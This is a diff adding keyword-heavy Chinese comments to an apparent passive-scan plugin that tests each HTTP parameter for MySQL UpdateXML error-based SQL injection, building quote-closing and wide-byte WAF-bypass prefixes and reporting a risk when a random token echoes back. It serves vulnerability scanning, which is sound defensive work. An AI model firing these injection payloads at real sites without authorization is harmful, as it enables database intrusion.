@@ -1,11 +1,56 @@
+// =============================================================================
+// MySQL UpdateXML 报错注入检测脚本 - SQL注入安全测试工具
+// 功能: 检测基于UpdateXML函数的MySQL报错注入漏洞
+// 用途: SQL注入测试、Web安全测试、漏洞扫描、渗透测试、安全审计
+//
+// 核心技术栈:
+// - fuzz.HTTPRequest: HTTP请求模糊测试
+// - GetCommonParams: 提取HTTP参数
+// - UpdateXML报错注入: 利用MySQL UpdateXML函数报错获取数据
+// - risk.NewRisk: 创建安全风险报告
+// - codec.EncodeToHex: 十六进制编码
+//
+// 攻击原理:
+// UpdateXML函数在处理格式错误的XML时会产生错误信息，
+// 通过concat函数将查询结果拼接到错误信息中，从而泄露数据
+//
+// 检测流程:
+// 1. 构造UpdateXML报错载荷
+// 2. 注入随机token用于验证
+// 3. 检测响应中是否包含token
+// 4. 生成安全风险报告
+//
+// 关键词: SQL注入 MySQL注入 报错注入 UpdateXML 安全测试 漏洞检测
+// 搜索标签: #sql-injection #mysql #error-based #updatexml #security-test
+// =============================================================================
+
+// ===== UpdateXML报错载荷构造函数 - 生成报错注入载荷 =====
+// 关键词: UpdateXML载荷, 报错注入, 载荷构造, MySQL函数, 注入载荷
+
+// 构造UpdateXML报错注入载荷 - 利用UpdateXML函数的报错机制
+// 关键词: buildUpdateXML, UpdateXML函数, concat函数, 报错载荷, 随机token
+// 参数说明:
+// - pre: 载荷前缀，用于闭合SQL语句
+// - suf: 载荷后缀，用于注释或闭合后续SQL
+// 返回值: 完整载荷字符串和验证token
 buildUpdateXML = (pre, suf) => {
+    // 生成随机字符串作为验证token
+    // 关键词: randstr, 随机字符串, 验证token, 载荷标识
     rand1 := randstr(10)
     rand2 := randstr(10)
     token := rand1 + rand2
 
+    // 构造UpdateXML报错注入载荷
+    // 关键词: UpdateXML语法, concat函数, 0x307e分隔符, 报错构造
     p1 = "and updatexml(1, concat(0x307e,"
+    
+    // 将随机字符串编码为十六进制 - 避免引号问题
+    // 关键词: codec.EncodeToHex, 十六进制编码, 字符串编码, 载荷编码
     payload = f"0x${codec.EncodeToHex(rand1)}, " + f`0x${codec.EncodeToHex(rand2)}`
     p2 = "), 1)"
+    
+    // 返回完整载荷和验证token
+    // 关键词: 载荷拼接, 完整载荷, 验证token, 注入载荷
     return pre+ p1 + payload + p2 + suf, token
 }
 
@@ -33,59 +78,124 @@ fixDesc = `
 6. 定期进行安全审计和渗透测试：这可以帮助检测和修复可能被攻击者利用的任何漏洞。
 7. 保持数据库软件和应用程序的更新：这是防止漏洞被利用的重要措施，因为许多更新都包含了对已知漏洞的修复。`
 
+// ===== SQL前缀构造函数 - 生成多种闭合方式的前缀 =====
+// 关键词: SQL前缀, 参数闭合, 注入前缀, 语句闭合, 参数类型检测
+
+// 构造SQL注入前缀 - 根据参数类型生成不同的闭合前缀
+// 关键词: sqlBuildPrefix, 参数类型检测, 语句闭合, 前缀生成, 注入构造
+// 参数说明:
+// - paramValue: 原始参数值，用于判断数据类型
+// 返回值: 包含多种闭合方式的前缀数组
 sqlBuildPrefix = func(paramValue) {
+    // 检测参数是否为纯数字 - 影响闭合方式
+    // 关键词: str.IsDigit, 数字检测, 参数类型, 数据类型判断
     pureInt = str.IsDigit(paramValue)
 
+    // 生成宽字节字符 - 用于绕过某些WAF
+    // 关键词: 宽字节, WAF绕过, randn, 字符生成, 编码绕过
     wideByte = string([uint8(randn(129, 254))])
     prefix = []
 
+    // 构造参数值列表 - 包含原始值和随机值
+    // 关键词: 参数值列表, 原始参数, 随机值, 值构造
     valueList = [paramValue]
+    
+    // 定义边界字符列表 - 用于闭合SQL语句
+    // 关键词: 边界字符, SQL闭合, 语句边界, 闭合符号
     boundaryList = [" ",")","))"]
 
+    // 根据参数类型构造格式字符串
+    // 关键词: 格式字符串, 参数类型, 字符串格式, 闭合格式
     formatString = "%s"
     if !pureInt {
+        // 非数字参数需要闭合引号
+        // 关键词: 引号闭合, 字符串参数, 宽字节绕过, 引号处理
         formatString = formatString + wideByte + "'"
         valueList = append(valueList, randstr(10))
     }
     formatString = formatString + "%s"
 
+    // 生成所有可能的前缀组合
+    // 关键词: 前缀组合, 双重循环, 组合生成, 前缀构造
     for v  in valueList {
         for b in boundaryList {
+            // 使用sprintf格式化前缀
+            // 关键词: sprintf, 字符串格式化, 前缀格式化, 组合前缀
             prefix.Push(sprintf(formatString,v,b))
         }
     }
     return prefix
 }
 
-# mirrorNewWebsitePathParams 每新出现一个网站路径且带有一些参数，参数通过常见位置和参数名去重，去重的第一个 HTTPFlow 在这里被调用
+// ===== 主要检测函数 - 被动扫描新网站路径参数 =====
+// 关键词: 被动扫描, 网站路径参数, HTTP流量分析, 参数去重, 自动检测
+
+// 被动扫描函数 - 每当发现新的网站路径和参数时自动调用
+// 关键词: mirrorNewWebsitePathParams, 被动扫描, 参数去重, HTTP流量, 自动检测
+// 参数说明:
+// - isHttps: 是否为HTTPS协议
+// - url: 目标URL地址
+// - req: HTTP请求原始数据
+// - rsp: HTTP响应原始数据  
+// - body: HTTP响应体数据
+// 功能: 对新发现的参数进行SQL注入检测
 mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    // 创建HTTP模糊测试对象 - 解析HTTP请求
+    // 关键词: fuzz.HTTPRequest, HTTP解析, 模糊测试, HTTPS支持
     freq = fuzz.HTTPRequest(req, fuzz.https(isHttps))~
+    
+    // 遍历所有通用参数进行检测
+    // 关键词: GetCommonParams, 参数遍历, 通用参数, 参数提取
     for param in freq.GetCommonParams() {
+        // 获取参数的原始值
+        // 关键词: GetFirstValue, 参数值, 原始值, 参数内容
         val := f`${param.GetFirstValue()}`
+        
+        // 检测参数值是否为数字 - 影响注入策略
+        // 关键词: str.IsDigit, 数字检测, 参数类型, 注入策略
         isNum = str.IsDigit(val)
+        
+        // 定义SQL注入后缀 - 用于注释后续SQL语句
+        // 关键词: SQL后缀, 注释符号, SQL注释, 语句终止
         var suffix = [" -- ", "#"]
+        
+        // 生成SQL注入前缀 - 根据参数值类型生成
+        // 关键词: SQL前缀, 前缀生成, 参数闭合, 注入前缀
         var prefix = sqlBuildPrefix(val)
 
+        // 双重循环测试所有前缀后缀组合
+        // 关键词: 组合测试, 前缀后缀, 载荷组合, 全面测试
         for suf in suffix {
             for pre in prefix {
+                // 构造UpdateXML报错注入载荷
+                // 关键词: buildUpdateXML, 载荷构造, 报错注入, UpdateXML
                 payload, token := buildUpdateXML(pre, suf)
+                
+                // 执行模糊测试 - 发送注入载荷
+                // 关键词: param.Fuzz, ExecFirst, 载荷发送, 注入测试
                 result, err := param.Fuzz(payload).ExecFirst()
                 if err != nil { continue }
 
+                // 检测响应中是否包含验证token - 确认注入成功
+                // 关键词: token检测, 响应检查, 注入确认, 漏洞验证
                 if string(result.ResponseRaw).Contains(token) {
+                    // 创建安全风险报告 - 记录发现的SQL注入漏洞
+                    // 关键词: risk.NewRisk, 风险报告, 漏洞记录, 安全报告
                     risk.NewRisk(
                         url,
-                        risk.severity("high"),
-                        risk.type("sqlinjection"),
+                        risk.severity("high"),                    // 高危漏洞
+                        risk.type("sqlinjection"),               // SQL注入类型
                         risk.title(f"MySQL UpdateXML Error-Based Injection: ${url}"),
                         risk.titleVerbose(f"SQL报错注入（UpdateXML）：: ${url}"),
                         risk.parameter(f`Param: ${param.Name()} OriginValue: ${val}`),
                         risk.payload(f`Payload: ${payload} Check-Token: ${token}`),
-                        risk.request(result.RequestRaw),
-                        risk.response(result.ResponseRaw),
-                        risk.description(desc),
-                        risk.solution(solution),
+                        risk.request(result.RequestRaw),         // 攻击请求
+                        risk.response(result.ResponseRaw),       // 响应数据
+                        risk.description(desc),                  // 漏洞描述
+                        risk.solution(solution),                 // 修复建议
                     )
+                    // 发现漏洞后立即返回 - 避免重复报告
+                    // 关键词: 漏洞发现, 立即返回, 重复避免, 检测完成
                     return
                 }
             }
